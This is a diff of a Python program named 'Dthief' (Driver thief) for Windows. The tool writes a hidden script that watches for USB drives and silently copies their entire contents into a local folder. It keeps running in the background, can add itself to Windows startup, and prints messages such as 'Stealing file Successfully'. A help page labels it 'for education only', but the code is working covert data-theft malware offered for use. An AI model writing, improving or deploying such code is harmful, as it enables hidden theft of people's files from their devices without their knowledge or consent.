@@ -7,7 +7,8 @@ setup_path=r"C:\DTheft\setup_Dthief.pyw"
 
 if not platform == "win32" :
     while True :
-        print(" Sorry This version is only for Windows OS\nA Linux verson will be available soon ")
+        print("This version is only for Windows OS")
+        os.system("cls")
         sleep(1.5)
 else :
     pass
@@ -53,57 +54,53 @@ def intro():
 intro()
 
 def help_page():
-    os.system("mode con: COLS=94 LINES=45")
+    os.system("mode con: COLS=94 LINES=49")
     os.system("color f")
 
-    print("""                             ___________________________
-                            |                           |
-                            |    Dthief v1.0 (help)     |
-                            |___________________________|
-                                     author : saad_anouar
-    
-===========================================================================================
-=    NOTICE :                                                                             =
-=             {Please Read carefully}                                                     =
-=                                                                                         =
-=    the Dthief v1.0 program work only for [windows os]                                   =
-=                                                                                         =
-=    Need to use following command "python setup_dthief.pyw" to open program in first     =
-=    time only, After you can just open command prompt and type "dthief".                 =
-=                                                                                         =
-=    Driver thief (Dthief): is a code writing by python3 language, and he use to copy     =
-=    data silently from any usb connected on windows to "C:\DTheft_Data" folder, where    =
-=    you find a folder named by date & time of copying data.                              = 
-=                                                                                         =
-=    The program run silently by enter (--run or --start) and stil working on background  =
-=                                                                                         =
-=    This program is purpose for education only, and any bad use the user remains respons =
-=    -ible for it, and the developer has nothing to do with the way the program is used.  =
-=                                                                                         =
-=    Dthief program is free for personal use only, and the link to the original program   =
-=    is on the famous website github on link bellow.                                      =
-=                                                                                         =
-=    In case for using from company, need to get writing authorization from developer for =
-=    that.                                                                                =
-=                                                                                         =
-=    For personal use for developing others softwares, need to write the correct name of  =
-=    developer on this code part before building or share your software or code.          = 
-=                                                                                         =
-=    List of Commands :                                                                   =
-=                      Enter                 : Home page                                  =
-=                      --run or --start      : Lanch the program                          =
-=                      --kill or --stop      : stop program from running                  =
-=                      --info or --help      : you direct to this help page               =
-=                      --link or --down      : visite original source                     =
-=                      --bootup or --startup : add Dthief to startup windows              =
-=                      --unboot or --breakup : remove Dthief from startup Windows         =
-= +_____________________________________________________________________________________+ =
-= |                                                                                     | =
-= | [KEEP IN MIND] after lanching the program, he still running on background even you  | =
-= | closed the terminal or exit program by typing (ctrl+C), and to stop him youneed to  | =
-= | write the command "--kill or stop" then you can exit                                | =
-= +_____________________________________________________________________________________+ =
-===========================================================================================
+    print("""*
+NOTICE :                   {Please Read carefully}                |  Dthief v1.0 (help)  |
+                                                                  | author : saad_anouar |                                                                        
+             The Dthief v1.0 program work only for [windows os]                                   
+                                                                                     
+  Need to use following command "python setup_dthief.pyw" or write "python " and slide the 
+     file "setup_dthief.pyw" to open it, and also do not rename the "setup_dthief.pyw".
+
+  The command "python setup_dthief.pyw" you can use it only for the first time, beacsue 
+                 After you can just open command prompt and type "dthief".                 
+                                                                                      
+  Driver thief (Dthief): is a code writing by python3 language, and he use to copy Data    
+      silently from any usb connected on windows to "C:\DTheft_Data" folder, where  
+           you find a folder named by date & time of copying data.                       
+
+  The program run silently by enter (--run or --start) and stil working on background.
+
+  The "log.txt" file created in folder with copied data is very important for ruuning 
+   the program, do not try (DELETE\RENAME\EDIT) the file. but you can read it by any 
+        editor, he content is only detailed informations about connected USB. 
+
+  This program is purpose for education only, and any bad use the user remains respons 
+-ible for it, and the developer has nothing to do with the way the program is used. 
+
+  Dthief program is free for personal use only, and the link to the original program 
+                    is on the famous website github on link bellow.     
+
+  In case for using from company, need to get writing authorization from developer for that.                                                                                
+
+  For personal use for developing others softwares, need to write the correct name of  
+     developer on this code part before building or share your software or code. 
+
+List of Commands :                                                                   
+                Enter                 : Home page                                  
+                --run or --start      : Lanch the program                          
+                --kill or --stop      : stop program from running                  
+                --info or --help      : you direct to this help page               
+                --link or --down      : visite original source                     
+                --bootup or --startup : add Dthief to startup windows              
+                --unboot or --breakup : remove Dthief from startup Windows         
+                                                                                     
+[KEEP IN MIND]: after lanching the program, he still running on background even you   
+                closed the terminal or exit program by typing (ctrl+C),and to stop 
+                him youneed to write the command "--kill or stop" then you can exit                                
 """)
 
 
@@ -115,135 +112,106 @@ def sys_dthief():
 
         dthief = open(r"C:\DTheft\dthief.pyw", "w")
         dthief.write("""\n
-import os, sys
+import subprocess, os, filecmp, shutil
 from datetime import datetime
-import os.path
-from time import sleep  
-import filecmp
-from shutil import copy2
+from time import sleep
+
+while True:
+
+    # path & variables 
+
+    tmp_file = r"C:\Temp\log.txt"
+
+    home_folder = r"C:\DTheft_USB"
+    now = datetime.now()
+    dt_string = now.strftime("%a%d%y%H%M%S")
+
+    newfolder = home_folder+chr(92)+dt_string+chr(92) 
+    files = str(newfolder)
+    makelog = str(newfolder)+"log.txt"
+    makefolder = str(newfolder)
+    make_abs = os.path.abspath(makelog)
 
 
-#path of file used
-home_folder = r"c:\DTheft_Data"
-tmp_file = r"C:\Temp\log.txt"
-checker = r"C:\Temp\check.txt"
-driver = r"C:\Temp\driver.txt"
+    output = subprocess.check_output("wmic logicaldisk get caption, drivetype", shell=True)
+    data = str(output)
+    x = data.find("2")
+    if not x == -1 :
+
+        get = data.find("2")
+        cvt = int(get)
+        divise = cvt - 9
+        getD = data[divise:cvt]
+        global lecteur
+        lecteur = getD[0:2]
+        print("Your driver stolen is: ", lecteur)
+        path_dir = "dir /W "+lecteur+">"+tmp_file
+        full_path_dir = str(path_dir)
+        cmd = "cmd /C" +full_path_dir
 
 
-# random folder
-now = datetime.now()
-dt_string = now.strftime("%m-%d-%y %H-%M-%S")""")
-        dthief.close()
-        dthief = open(r"C:\DTheft\dthief.pyw", "a")
-        dthief.writelines("""\nmakefolder = home_folder+"\\"+dt_string+"\\""")
-        dthief.close()
-        dthief = open(r"C:\DTheft\dthief.pyw", "a")
-        dthief.write("""\n
-while True :
-
-    # check directory 
-
-    if not os.path.exists(home_folder) :
-        os.mkdir(home_folder) 
+        os.system(cmd)      # Creat the log file into c:\temp\log.txt
+        
 
 
-    # earasing file 
-    def reborn():
-        ''' function for delete file if exist on machine'''
 
-        if os.path.exists(driver) :
-            os.remove(driver)
-        if os.path.exists(tmp_file) :
-            os.remove(tmp_file)
-        if os.path.exists(checker) :
-            os.remove(checker)
-    reborn()
+        if not os.path.exists(home_folder):
+            os.system("cls")
+            print("Folder name is: ",dt_string)
+            add_folder = "md "+newfolder
+            os.system(add_folder)
 
-    # Creat rapport drivers
-    def get_driver_info() :
-        ''' creat a file 'information about your driver machine' to check if USB contected'''
-
-        string_drive = "wmic logicaldisk get caption, drivetype >"
-        full_path = string_drive+driver
-        os.system(full_path)
-    get_driver_info()
-
-
-    # Read rapport drivers and check USB Drive
-    def file_drive():
-        ''' function read Driver info file and check if USB connected, if True creat a file with USB information'''
-
-        file_drive = open(r"C:\Temp\driver.txt", "r")
-
-        for i in file_drive :
-            if "2" in i :
-
-                
-                indixing = i.find("2")
-                degital = int(indixing)
-                drive = i[:degital]
-                lecteur = drive[1]
-                # creat a log file content all information about USB          
-                path_dir = "dir /W "+lecteur+": >"+tmp_file
-                full_path_dir = str(path_dir)
-                cmd = "cmd /C" +full_path_dir
-                os.system(cmd)
-
+            shutil.copyfile(tmp_file, make_abs)
+            dthief_files = "xcopy "+lecteur+"\*.* /Q /E /Y "+files+"*.*"
+            os.system(dthief_files)
             
-    file_drive()
 
-
-    # Creat Rapport comparision
-    def path_directory(): 
-        ''' function search in Dthief directory the log file and comapre content with log file of USB connected  to create a result comparition file'''
-
-        if os.path.exists(tmp_file) :
-
+        elif os.path.exists(home_folder):
+            list_comp = []
             for dirpath, dirnames, filenames in os.walk(home_folder):
                 for filenames in [f for f in filenames if f.endswith("log.txt")]:
                     log = os.path.join(dirpath, filenames)
+                    comp = filecmp.cmp(log, tmp_file)                 
+                    list_comp.append(comp)
                     
 
-                    comp = filecmp.cmp(log, tmp_file)
-                    string_comp = str(comp)
-                    f = open(r"C:\Temp\check.txt", "a")""")
-        dthief.close()
-        dthief = open(r"C:\DTheft\dthief.pyw", "a")
-        dthief.writelines('''
-                    f.write(string_comp+"\\n")''')
-        dthief.close()
-        dthief = open(r"C:\DTheft\dthief.pyw", "a")
-        dthief.write("""
-                    f.close
-                else :
-                    f3 = open(r"C:\Temp\check.txt", "a")
-                    f3.write("False")
-                    f3.close
-    path_directory()
-
-
-
-    def rapport_drivers():
-
-        if os.path.exists(checker) :
             
-            with open(r"C:\Temp\check.txt") as f1 :
-        
-                line = [i.strip() for i in f1.readlines()]
-                print(line)
-                if "True" in line :
-                    return
-                elif "True" not in line:
-                    os.mkdir(makefolder)
-                    copy2(tmp_file, makefolder)
+            print(list_comp)
+            if True in list_comp :
+                os.system("cls")
+                print("file found : ")
+                print(" ")
+                for content in os.listdir(lecteur):
+                    print(content)
+                    sleep(1.0)
+                    
 
-                    ### command line or defin copy all object inside usb and passt them here
+            else :
+                os.system("cls")
+                print("Folder name is: ",dt_string)
+                print(" ")
+                add_folder = "md "+newfolder
+                os.system(add_folder)
 
-        elif not os.path.exists(checker):
-            pass   
-    
+                shutil.copyfile(tmp_file, make_abs)
+                print("Stealing file Successfully  ...")
+                print(" ")
+                dthief_files = "xcopy "+lecteur+"\*.* /Q /E /Y "+files+"*.*"
+                os.system(dthief_files)
+                for content in os.listdir(lecteur):
+                    print(content)
+                    sleep(2.0)
+                    
+                            
+    else :
+        print("USB (not found) ")
+        sleep(1.5)
 
-    rapport_drivers()""")
+
+
+
+
+        """)
         dthief.close()
         os.system("attrib +R +H C:\DTheft\dthief.pyw")
     Dthief_program()
